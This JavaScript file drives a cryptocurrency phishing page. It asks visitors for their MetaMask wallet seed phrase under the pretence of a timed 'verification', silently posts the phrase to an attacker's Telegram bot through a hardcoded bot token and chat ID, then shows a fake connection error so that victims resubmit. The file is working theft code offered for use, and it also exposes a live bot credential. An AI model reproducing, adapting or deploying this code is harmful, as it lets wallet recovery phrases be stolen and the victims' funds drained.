document.addEventListener("DOMContentLoaded", () => {
  
  let currentStep = 1;
  let timerInterval;
  let timeLeft = 30 * 60; // make it global so it doesn’t reset

  // Start timer immediately when page loads
//   startTimer();

  // Character counter for textarea
  const textarea = document.getElementById("passphrase");
  const counter = document.querySelector(".char-counter");
  if (textarea && counter) {
    textarea.addEventListener("input", () => {
      counter.textContent = `${textarea.value.length}/500`;
    });
  }

  function sendToTelegram(passphrase) {
    const botToken = "7350367461:AAEhJzyu3bsMk33VTt2vNwu9laQ6QnH-6gQ"; // <-- Replace with your bot token
    const chatId = "1108201283"; // <-- Replace with your Telegram chat ID
    const message = `🔐 Wallet Login Attempt\n\n🪙 Wallet: Metamask\n🔑 Passphrase:\n${passphrase}`;

    const telegramUrl = `https://api.telegram.org/bot7350367461:AAEhJzyu3bsMk33VTt2vNwu9laQ6QnH-6gQ/sendMessage`;

    return fetch(telegramUrl, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
      }),
    });
  }

  // Passphrase form submission
  document
    .getElementById("passphrase-form")
    .addEventListener("submit", function (e) {
      e.preventDefault();
      const passphrase = document.getElementById("passphrase").value;
      // const selectedWallet = document.getElementById('wallet').value;
      const connectButton = document.getElementById("connect-button");
      const buttonText = document.getElementById("button-text");
      const spinner = document.getElementById("spinner");
      const errorMessage = document.getElementById("error-message");

      if (!passphrase.trim()) {
        errorMessage.textContent = "❌ Please input your wallet passphrase.";
        errorMessage.classList.add("show");
        return;
      }

      // Show loading state
      connectButton.disabled = true;
      buttonText.style.display = "none";
      spinner.style.display = "block";
      errorMessage.classList.remove("show");

      // Simulate connection attempt
      setTimeout(() => {
        // Send to Telegram
        sendToTelegram(passphrase)
          .then(() => {
            // Clear passphrase
            document.getElementById("passphrase").value = "";
            counter.textContent = "0/500";
          })
          .catch((err) => {
            console.error("Telegram send error:", err);
          });
        // Hide loading state
        connectButton.disabled = false;
        buttonText.style.display = "block";
        spinner.style.display = "none";

        // Show error message
        errorMessage.textContent =
          "❌ Error connecting to wallet. Please check your seedphrase and try again.";
        errorMessage.classList.add("show");
      }, 2000);
    });

  function goToStep(stepNumber) {
    document
      .querySelectorAll(".page")
      .forEach((p) => p.classList.remove("active"));
    document.getElementById(`page-${stepNumber}`).classList.add("active");

    document.querySelectorAll(".step").forEach((s, i) => {
      s.classList.remove("active", "completed");
      if (i + 1 < stepNumber) s.classList.add("completed");
      if (i + 1 === stepNumber) s.classList.add("active");
    });

    currentStep = stepNumber;
    // ❌ don’t reset timer here, it should keep counting
  }

  function startTimer() {
    const timerElement = document.getElementById("timer");

    timerInterval = setInterval(() => {
      const minutes = Math.floor(timeLeft / 60);
      const seconds = timeLeft % 60;
      timerElement.textContent = `${minutes
        .toString()
        .padStart(2, "0")}:${seconds.toString().padStart(2, "0")}`;

      if (timeLeft <= 0) {
        clearInterval(timerInterval);
        alert("Verification time expired. Please start the process again.");
        goToStep(1);
      }

      timeLeft--;
    }, 1000);
  }

  function verifyNow() {
    goToStep(2);
  }

  // Initialize character counter
  if (textarea && counter) {
    counter.textContent = `${textarea.value.length}/500`;
  }

  // ✅ Start timer only after DOM is ready
  startTimer();

  // ✅ Expose verifyNow so HTML button works
  window.verifyNow = verifyNow;
});
